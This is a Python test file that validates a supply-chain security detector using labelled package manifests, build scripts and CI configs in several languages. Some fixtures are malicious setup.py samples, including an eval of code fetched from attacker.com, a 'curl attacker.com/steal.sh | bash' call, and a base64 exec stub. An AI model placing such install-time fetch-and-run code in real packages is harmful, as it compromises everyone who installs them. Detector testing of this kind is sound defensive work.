#!/usr/bin/env python3
"""
Supply Chain Security Detector Validation Tests

IMPORTANT: This detector (test_supply_chain_security.py) focuses on:
- Dependency confusion attacks (HIGH severity, auto-fail)
- Malicious setup.py/build scripts (HIGH severity, auto-fail)
- Version pinning and reproducible builds (MEDIUM severity)

Different from test_supply_chain.py which focuses on package installation security.

Test Coverage:
- JavaScript: Dependency confusion, unpinned versions, postinstall scripts
- Python: Dependency confusion, malicious setup.py, hash verification
- Go: Replace directives, GOSUMDB, module naming
- Rust: Git dependencies, version pinning, crate naming
- PHP: Composer security, post-install scripts
- Maven: exec-maven-plugin, version management
- CI/CD: Vulnerability scanning, SBOM generation
"""
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from tests.test_supply_chain_security import SupplyChainSecurityDetector
from tests.detector_validation._base_detector_test import (
    BaseDetectorValidationTest,
    DetectorValidationSample
)


class TestSupplyChainSecurityDetectorValidation(BaseDetectorValidationTest):
    def get_detector(self):
        return SupplyChainSecurityDetector()

    def get_samples(self):
        return [
            # ==================== JAVASCRIPT SAMPLES ====================

            # JS Vulnerable #1: Unpinned versions with caret (MEDIUM)
            DetectorValidationSample(
                name="js_unpinned_caret",
                code='''{
  "name": "my-app",
  "dependencies": {
    "express": "^4.17.1",
    "lodash": "4.17.21"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned package version with caret (^) - MEDIUM severity",
                tags=["javascript", "unpinned", "medium"]
            ),

            # JS Vulnerable #2: Unpinned versions with tilde (MEDIUM)
            DetectorValidationSample(
                name="js_unpinned_tilde",
                code='''{
  "dependencies": {
    "react": "~17.0.2",
    "axios": "0.21.1"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned package version with tilde (~) - MEDIUM severity",
                tags=["javascript", "unpinned", "medium"]
            ),

            # JS Vulnerable #3: Unpinned with wildcard (MEDIUM)
            DetectorValidationSample(
                name="js_unpinned_wildcard",
                code='''{
  "dependencies": {
    "moment": "*"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Wildcard version (*) - MEDIUM severity",
                tags=["javascript", "unpinned", "medium"]
            ),

            # JS Vulnerable #4: Using 'latest' tag (MEDIUM)
            DetectorValidationSample(
                name="js_unpinned_latest",
                code='''{
  "dependencies": {
    "webpack": "latest"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Using 'latest' tag - MEDIUM severity",
                tags=["javascript", "unpinned", "medium"]
            ),

            # JS Vulnerable #5: Dependency confusion - company-auth without scope (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="js_dependency_confusion_company",
                code='''{
  "dependencies": {
    "express": "4.17.1",
    "company-auth": "1.0.0",
    "lodash": "4.17.21"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Dependency confusion - 'company-auth' without @scope - HIGH, AUTO-FAIL",
                tags=["javascript", "dependency_confusion", "auto_fail"]
            ),

            # JS Vulnerable #6: Dependency confusion - internal-utils (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="js_dependency_confusion_internal",
                code='''{
  "dependencies": {
    "internal-utils": "2.1.0",
    "private-config": "1.5.0"
  }
}''',
                language="javascript",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Dependency confusion - internal/private packages without scope - HIGH, AUTO-FAIL",
                tags=["javascript", "dependency_confusion", "auto_fail"]
            ),

            # JS Vulnerable #7: Postinstall script (INFO)
            DetectorValidationSample(
                name="js_postinstall_script",
                code='''{
  "name": "my-package",
  "scripts": {
    "postinstall": "node install.js",
    "test": "jest"
  },
  "dependencies": {
    "express": "4.17.1"
  }
}''',
                language="javascript",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(2, 2),
                description="Postinstall script - INFO severity, doesn't affect score",
                tags=["javascript", "postinstall", "info"]
            ),

            # JS Secure #8: Proper package.json with exact versions and package-lock mention
            DetectorValidationSample(
                name="js_secure_pinned_with_lock",
                code='''{
  "name": "my-secure-app",
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.21",
    "@company/auth": "1.0.0"
  },
  "devDependencies": {
    "eslint": "7.32.0"
  }
}
Note: Ensure package-lock.json is committed to version control.''',
                language="javascript",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SECURE"],
                expected_score=(2, 2),
                description="Secure: exact versions + package-lock.json mention + scoped packages",
                tags=["javascript", "secure"]
            ),

            # JS Secure #9: npm ci mentioned (good practice)
            DetectorValidationSample(
                name="js_secure_npm_ci",
                code='''{
  "name": "ci-app",
  "scripts": {
    "install-ci": "npm ci",
    "build": "webpack"
  },
  "dependencies": {
    "react": "17.0.2"
  }
}''',
                language="javascript",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SECURE"],
                expected_score=(2, 2),
                description="Secure: npm ci for reproducible builds",
                tags=["javascript", "secure"]
            ),

            # ==================== PYTHON SAMPLES ====================

            # Python Vulnerable #10: Unpinned with >= (MEDIUM)
            DetectorValidationSample(
                name="python_unpinned_gte",
                code='''flask>=2.0.0
requests>=2.25.0
django>=3.2''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned packages with >= - MEDIUM severity",
                tags=["python", "unpinned", "medium"]
            ),

            # Python Vulnerable #11: Unpinned with > (MEDIUM)
            DetectorValidationSample(
                name="python_unpinned_gt",
                code='''numpy>1.20.0
pandas>1.3.0''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned packages with > - MEDIUM severity",
                tags=["python", "unpinned", "medium"]
            ),

            # Python Vulnerable #12: Package without version (MEDIUM)
            DetectorValidationSample(
                name="python_no_version",
                code='''flask
requests
celery''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Package without version constraint - MEDIUM severity",
                tags=["python", "unpinned", "medium"]
            ),

            # Python Vulnerable #13: Dependency confusion - company-auth (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="python_dependency_confusion_company",
                code='''flask==2.0.1
company-auth==1.0.0
requests==2.26.0''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Dependency confusion - 'company-auth' without unique prefix - HIGH, AUTO-FAIL",
                tags=["python", "dependency_confusion", "auto_fail"]
            ),

            # Python Vulnerable #14: Dependency confusion - internal-utils (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="python_dependency_confusion_internal",
                code='''django==3.2.5
internal-utils==2.1.0
auth-lib==1.5.0''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Dependency confusion - internal/auth packages - HIGH, AUTO-FAIL",
                tags=["python", "dependency_confusion", "auto_fail"]
            ),

            # Python Vulnerable #15: No hash verification (MEDIUM)
            DetectorValidationSample(
                name="python_no_hash_verification",
                code='''flask==2.0.1
requests==2.26.0
celery==5.1.2''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Pinned versions but no hash verification (--hash) - MEDIUM severity",
                tags=["python", "no_hash", "medium"]
            ),

            # Python Vulnerable #16: Malicious setup.py with exec (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="python_setup_py_exec",
                code='''from setuptools import setup, find_packages
import base64

# Malicious code execution
exec(base64.b64decode('aW1wb3J0IG9z'))

setup(
    name='malicious-package',
    version='1.0.0',
    packages=find_packages()
)''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Malicious setup.py with exec() - HIGH, AUTO-FAIL",
                tags=["python", "malicious_setup", "auto_fail"]
            ),

            # Python Vulnerable #17: Malicious setup.py with eval (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="python_setup_py_eval",
                code='''from setuptools import setup
import urllib.request

# Fetch and execute remote code
payload = eval(urllib.request.urlopen('http://attacker.com/code.py').read())

setup(name='evil-package', version='1.0')''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Malicious setup.py with eval() - HIGH, AUTO-FAIL",
                tags=["python", "malicious_setup", "auto_fail"]
            ),

            # Python Vulnerable #18: Malicious setup.py with __import__ (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="python_setup_py_import",
                code='''from setuptools import setup

# Dynamic import for malicious purposes
os = __import__('os')
os.system('curl http://attacker.com/steal.sh | bash')

setup(name='backdoor-package', version='1.0')''',
                language="python",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Malicious setup.py with __import__() - HIGH, AUTO-FAIL",
                tags=["python", "malicious_setup", "auto_fail"]
            ),

            # Python Secure #19: Proper requirements with hashes
            DetectorValidationSample(
                name="python_secure_with_hashes",
                code='''flask==2.0.1 --hash=sha256:1c4c726b1a9b5...
requests==2.26.0 --hash=sha256:6c1246513ecd5ecd4528a0906f910e8f0f...
celery==5.1.2 --hash=sha256:f4efebe6f8629b0da2b8e529424de376a58b...''',
                language="python",
                expected_verdict="SECURE",
                expected_vulnerabilities=[],
                expected_score=(2, 2),
                description="Secure: pinned versions with hash verification",
                tags=["python", "secure"]
            ),

            # ==================== GO SAMPLES ====================

            # Go Vulnerable #20: Replace to parent directory (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="go_replace_parent_dir",
                code='''module example.com/myapp

go 1.17

require (
    github.com/company/auth v1.0.0
    github.com/gin-gonic/gin v1.7.4
)

replace github.com/company/auth => ../local-auth''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Replace directive to ../ path - HIGH, AUTO-FAIL",
                tags=["go", "replace_directive", "auto_fail"]
            ),

            # Go Vulnerable #21: Replace to /tmp/ (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="go_replace_tmp",
                code='''module example.com/service

require github.com/company/utils v2.0.0

replace github.com/company/utils => /tmp/utils''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Replace directive to /tmp/ - HIGH, AUTO-FAIL",
                tags=["go", "replace_directive", "auto_fail"]
            ),

            # Go Vulnerable #22: Replace to absolute path (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="go_replace_absolute",
                code='''module example.com/app

require github.com/company/auth v1.2.3

replace github.com/company/auth => /shared/modules/auth''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Replace directive to absolute path - HIGH, AUTO-FAIL",
                tags=["go", "replace_directive", "auto_fail"]
            ),

            # Go Vulnerable #23: GOSUMDB=off (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="go_gosumdb_off",
                code='''module example.com/app

# Build instructions:
# export GOSUMDB=off
# go build

require (
    github.com/gin-gonic/gin v1.7.4
)''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="GOSUMDB=off disables checksum verification - HIGH, AUTO-FAIL",
                tags=["go", "gosumdb", "auto_fail"]
            ),

            # Go Vulnerable #24: GOPRIVATE=* (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="go_goprivate_wildcard",
                code='''module example.com/app

// Set GOPRIVATE=* to skip checksum database
require github.com/some/module v1.0.0''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="GOPRIVATE=* disables verification for all modules - HIGH, AUTO-FAIL",
                tags=["go", "goprivate", "auto_fail"]
            ),

            # Go Vulnerable #25: Simple module name - single line format (MEDIUM)
            DetectorValidationSample(
                name="go_simple_module_name",
                code='''module example.com/app

require company/auth v1.0.0
require github.com/gin-gonic/gin v1.7.4''',
                language="go",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Simple module name (company/auth) on same line as require - MEDIUM",
                tags=["go", "simple_name", "medium"]
            ),

            # Go Secure #26: Proper go.mod with go.sum mention
            DetectorValidationSample(
                name="go_secure_with_gosum",
                code='''module example.com/secure-app

go 1.17

require (
    github.com/gin-gonic/gin v1.7.4
    github.com/company/auth v1.2.3
    go.uber.org/zap v1.19.1
)

// Ensure go.sum is committed for module verification''',
                language="go",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SECURE"],
                expected_score=(2, 2),
                description="Secure: proper versioning with go.sum mention",
                tags=["go", "secure"]
            ),

            # ==================== RUST SAMPLES ====================

            # Rust Vulnerable #27: Wildcard version with version = "0.*" (MEDIUM)
            DetectorValidationSample(
                name="rust_wildcard_version",
                code='''[package]
name = "my-app"
version = "0.1.0"

[dependencies]
serde = { version = "0.*" }
tokio = "1.12.0"''',
                language="rust",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Wildcard version (0.*) in long form - MEDIUM severity",
                tags=["rust", "wildcard", "medium"]
            ),

            # Rust Vulnerable #28: Wildcard with *.* (MEDIUM)
            DetectorValidationSample(
                name="rust_wildcard_star_dot",
                code='''[dependencies]
tokio = { version = "*.*" }
reqwest = "0.11.4"''',
                language="rust",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Wildcard version (*.*) - MEDIUM severity",
                tags=["rust", "wildcard", "medium"]
            ),

            # Rust Vulnerable #29: Git dependency without rev/tag/branch (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="rust_git_no_rev",
                code='''[dependencies]
tokio = "1.12.0"
company-crypto = { git = "https://github.com/company/crypto" }''',
                language="rust",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Git dependency without rev/tag/branch - HIGH, AUTO-FAIL",
                tags=["rust", "git_dep", "auto_fail"]
            ),

            # Rust Vulnerable #30: Git dependency without pinning (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="rust_git_unpinned",
                code='''[dependencies]
serde = "1.0"
internal-auth = { git = "https://github.com/company/auth" }
reqwest = "0.11"''',
                language="rust",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Git dependency tracks HEAD without pinning - HIGH, AUTO-FAIL",
                tags=["rust", "git_dep", "auto_fail"]
            ),

            # Rust Vulnerable #31: Simple crate name (MEDIUM)
            DetectorValidationSample(
                name="rust_simple_crate_name",
                code='''[dependencies]
tokio = "1.12.0"
company-auth = "1.0.0"
internal-utils = "2.1.0"''',
                language="rust",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Simple internal crate names - potential confusion - MEDIUM",
                tags=["rust", "simple_name", "medium"]
            ),

            # Rust Secure #32: Proper Cargo.toml with pinned versions and Cargo.lock
            DetectorValidationSample(
                name="rust_secure_pinned_with_lock",
                code='''[package]
name = "secure-app"
version = "1.0.0"

[dependencies]
tokio = { version = "1.12.0", features = ["full"] }
serde = "1.0.130"
reqwest = "0.11.4"
my-secure-lib = { git = "https://github.com/mycompany/secure-lib", rev = "abc123def456" }

# Ensure Cargo.lock is committed for reproducible builds''',
                language="rust",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SECURE"],
                expected_score=(2, 2),
                description="Secure: pinned versions, git with rev, Cargo.lock mention",
                tags=["rust", "secure"]
            ),

            # ==================== PHP COMPOSER SAMPLES ====================

            # PHP Vulnerable #33: Unpinned with caret (MEDIUM)
            DetectorValidationSample(
                name="php_unpinned_caret",
                code='''{
  "name": "company/app",
  "require": {
    "symfony/http-foundation": "^5.3",
    "doctrine/orm": "2.9.5"
  }
}''',
                language="json",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned Composer package with caret (^) - MEDIUM severity",
                tags=["php", "unpinned", "medium"]
            ),

            # PHP Vulnerable #34: Unpinned with tilde (MEDIUM)
            DetectorValidationSample(
                name="php_unpinned_tilde",
                code='''{
  "require": {
    "monolog/monolog": "~2.3",
    "guzzlehttp/guzzle": "7.3.0"
  }
}''',
                language="json",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Unpinned Composer package with tilde (~) - MEDIUM severity",
                tags=["php", "unpinned", "medium"]
            ),

            # PHP Vulnerable #35: dev-master version (MEDIUM)
            DetectorValidationSample(
                name="php_dev_master",
                code='''{
  "require": {
    "company/utils": "dev-master"
  }
}''',
                language="json",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Using dev-master - unpinned branch - MEDIUM severity",
                tags=["php", "unpinned", "medium"]
            ),

            # PHP Vulnerable #36: Post-install script (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="php_post_install_script",
                code='''{
  "name": "company/app",
  "require": {
    "symfony/console": "5.3.7"
  },
  "scripts": {
    "post-install-cmd": [
      "php artisan clear:cache",
      "@php install.php"
    ],
    "post-update-cmd": "composer dump-autoload"
  }
}''',
                language="json",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Composer post-install-cmd script - HIGH, AUTO-FAIL",
                tags=["php", "post_install", "auto_fail"]
            ),

            # PHP Vulnerable #37: Simple vendor name (MEDIUM)
            DetectorValidationSample(
                name="php_simple_vendor_name",
                code='''{
  "require": {
    "symfony/console": "5.3.7",
    "company/auth": "1.0.0",
    "internal/config": "2.1.0"
  }
}''',
                language="json",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Simple vendor names (company/auth) - potential confusion - MEDIUM",
                tags=["php", "simple_name", "medium"]
            ),

            # PHP Secure #38: Proper composer.json with exact versions and lock file
            DetectorValidationSample(
                name="php_secure_with_lock",
                code='''{
  "name": "secure/app",
  "require": {
    "symfony/http-foundation": "5.3.7",
    "doctrine/orm": "2.9.5",
    "monolog/monolog": "2.3.5"
  },
  "config": {
    "optimize-autoloader": true,
    "sort-packages": true
  }
}
# Ensure composer.lock is committed for reproducible builds''',
                language="json",
                expected_verdict="SECURE",
                expected_vulnerabilities=["SECURE"],
                expected_score=(2, 2),
                description="Secure: exact versions with composer.lock mention",
                tags=["php", "secure"]
            ),

            # ==================== MAVEN SAMPLES ====================

            # Maven Vulnerable #39: LATEST version (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="maven_latest_version",
                code='''<project>
  <dependencies>
    <dependency>
      <groupId>com.company</groupId>
      <artifactId>company-auth</artifactId>
      <version>LATEST</version>
    </dependency>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-core</artifactId>
      <version>5.3.9</version>
    </dependency>
  </dependencies>
</project>''',
                language="xml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Maven LATEST version - unpredictable - HIGH, AUTO-FAIL",
                tags=["maven", "latest", "auto_fail"]
            ),

            # Maven Vulnerable #40: RELEASE version (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="maven_release_version",
                code='''<dependencies>
  <dependency>
    <groupId>com.company</groupId>
    <artifactId>utils</artifactId>
    <version>RELEASE</version>
  </dependency>
</dependencies>''',
                language="xml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="Maven RELEASE version - unpredictable - HIGH, AUTO-FAIL",
                tags=["maven", "release", "auto_fail"]
            ),

            # Maven Vulnerable #41: exec-maven-plugin (HIGH, AUTO-FAIL)
            DetectorValidationSample(
                name="maven_exec_plugin",
                code='''<build>
  <plugins>
    <plugin>
      <groupId>org.codehaus.mojo</groupId>
      <artifactId>exec-maven-plugin</artifactId>
      <version>3.0.0</version>
      <executions>
        <execution>
          <phase>compile</phase>
          <goals>
            <goal>exec</goal>
          </goals>
          <configuration>
            <executable>curl</executable>
            <arguments>
              <argument>http://example.com/script.sh</argument>
            </arguments>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>''',
                language="xml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(0, 2),
                description="exec-maven-plugin executes code during build - HIGH, AUTO-FAIL",
                tags=["maven", "exec_plugin", "auto_fail"]
            ),

            # Maven Vulnerable #42: Simple artifactId (MEDIUM)
            DetectorValidationSample(
                name="maven_simple_artifact_id",
                code='''<dependencies>
  <dependency>
    <groupId>com.company</groupId>
    <artifactId>company-auth</artifactId>
    <version>1.0.0</version>
  </dependency>
  <dependency>
    <groupId>com.internal</groupId>
    <artifactId>internal-utils</artifactId>
    <version>2.1.0</version>
  </dependency>
</dependencies>''',
                language="xml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="Simple artifactIds - potential confusion with Maven Central - MEDIUM",
                tags=["maven", "simple_name", "medium"]
            ),

            # Maven Secure #43: Proper pom.xml with exact versions
            DetectorValidationSample(
                name="maven_secure_pinned",
                code='''<project>
  <dependencies>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-core</artifactId>
      <version>5.3.9</version>
    </dependency>
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.12.5</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.8.1</version>
      </plugin>
    </plugins>
  </build>
</project>''',
                language="xml",
                expected_verdict="SECURE",
                expected_vulnerabilities=[],
                expected_score=(2, 2),
                description="Secure: exact versions, no exec-maven-plugin, proper groupIds",
                tags=["maven", "secure"]
            ),

            # ==================== YAML CI/CD SAMPLES ====================

            # YAML Vulnerable #44: No vulnerability scanning (MEDIUM)
            DetectorValidationSample(
                name="yaml_no_scanning",
                code='''name: CI Pipeline

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install dependencies
        run: npm install
      - name: Build
        run: npm run build
      - name: Test
        run: npm test''',
                language="yaml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="CI/CD pipeline without vulnerability scanning - MEDIUM severity",
                tags=["yaml", "no_scanning", "medium"]
            ),

            # YAML Vulnerable #45: No SBOM generation (INFO) and no scanning (MEDIUM)
            DetectorValidationSample(
                name="yaml_no_sbom",
                code='''stages:
  - build
  - test
  - deploy

build:
  stage: build
  script:
    - npm install
    - npm run build

test:
  stage: test
  script:
    - npm test''',
                language="yaml",
                expected_verdict="VULNERABLE",
                expected_vulnerabilities=["SUPPLY_CHAIN_VULNERABILITY"],
                expected_score=(1, 2),
                description="No SBOM (INFO) and no vulnerability scanning (MEDIUM)",
                tags=["yaml", "no_sbom", "no_scanning", "medium"]
            ),

            # YAML Secure #46: Pipeline with npm audit
            DetectorValidationSample(
                name="yaml_with_npm_audit",
                code='''name: Secure CI Pipeline

on: [push]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install dependencies
        run: npm ci
      - name: Security audit
        run: npm audit
      - name: Build
        run: npm run build''',
                language="yaml",
                expected_verdict="SECURE",
                expected_vulnerabilities=[],
                expected_score=(2, 2),
                description="Secure: CI/CD with npm audit for vulnerability scanning",
                tags=["yaml", "secure"]
            ),

            # YAML Secure #47: Pipeline with Snyk
            DetectorValidationSample(
                name="yaml_with_snyk",
                code='''pipeline:
  stages:
    - security
    - build

security_scan:
  stage: security
  script:
    - npm install
    - snyk test
    - snyk monitor

build_app:
  stage: build
  script:
    - npm run build''',
                language="yaml",
                expected_verdict="SECURE",
                expected_vulnerabilities=[],
                expected_score=(2, 2),
                description="Secure: CI/CD with Snyk vulnerability scanning",
                tags=["yaml", "secure"]
            ),

            # YAML Secure #48: Pipeline with SBOM generation and scanning
            DetectorValidationSample(
                name="yaml_with_sbom",
                code='''name: CI with SBOM and Scanning

jobs:
  build:
    steps:
      - checkout
      - run: npm ci
      - run: npm audit
      - run: npm run build
      - run: syft . -o cyclonedx > sbom.json
      - upload-artifact: sbom.json''',
                language="yaml",
                expected_verdict="SECURE",
                expected_vulnerabilities=[],
                expected_score=(2, 2),
                description="Secure: CI/CD with both vulnerability scanning and SBOM",
                tags=["yaml", "secure"]
            ),
        ]


if __name__ == '__main__':
    import unittest
    suite = unittest.TestLoader().loadTestsFromTestCase(TestSupplyChainSecurityDetectorValidation)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    if result.wasSuccessful():
        print("\n✅ All Supply Chain Security detector validation tests PASSED")
    else:
        print(f"\n❌ {len(result.failures)} Supply Chain Security detector validation tests FAILED")
        sys.exit(1)
